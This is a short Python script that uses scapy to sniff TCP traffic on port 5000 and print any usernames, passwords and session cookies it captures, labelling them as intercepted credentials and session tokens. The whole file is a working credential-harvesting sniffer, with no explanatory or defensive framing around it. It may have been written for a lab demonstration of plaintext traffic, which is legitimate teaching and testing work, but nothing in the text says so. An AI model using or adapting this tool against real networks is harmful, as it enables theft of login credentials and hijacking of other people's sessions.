from scapy.all import sniff, TCP, Raw

def packet_callback(packet):
    try:
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            
            if "username=" in payload or "password=" in payload:
                print("\n[+]INTERCEPTED CREDENTIALS (POST Body):")
                for line in payload.split('\r\n'):
                    if "username=" in line or "password=" in line or "=" in line:
                        print(f"    [CREDENTIAL] {line}")

            if "Cookie:" in payload or "Set-Cookie:" in payload:
                print("\n[+]INTERCEPTED SESSION TOKEN:")
                for line in payload.split('\r\n'):
                    if "Cookie:" in line or "Set-Cookie:" in line:
                        print(f"    [SESSION] {line}")
                        
    except Exception as e:
        pass

def start_sniffer():
    print("[*] Starting Enhanced Packet Sniffer on port 5000...")
    print("[*] Listening for login credentials and session cookies...")
    sniff(filter="tcp port 5000", prn=packet_callback, store=0)

if __name__ == "__main__":
    start_sniffer()